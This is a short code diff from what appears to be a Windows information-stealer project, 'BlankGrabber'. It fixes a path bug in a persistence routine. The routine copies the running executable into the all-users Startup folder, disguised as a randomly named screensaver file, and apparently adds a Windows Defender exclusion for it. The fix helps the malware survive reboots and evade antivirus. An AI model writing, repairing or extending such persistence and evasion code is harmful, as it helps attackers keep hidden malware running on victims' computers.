@@ -672,7 +672,7 @@ if __name__ == "__main__":
             if STARTUP:
                 if os.path.dirname(os.path.abspath(sys.executable)).lower().split(os.sep)[-1].lower() != "startup":
                     try:
-                        exepath = os.path.join("C:", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
+                        exepath = os.path.join("C:/ProgramData", "Microsoft", "Windows", "Start Menu", "Programs", "StartUp", f"ScreenSaver-{generate()}.scr")
                         BlankGrabber.copy("Blank", sys.executable, exepath)
                         wd_exclude(exepath)
                     except Exception:
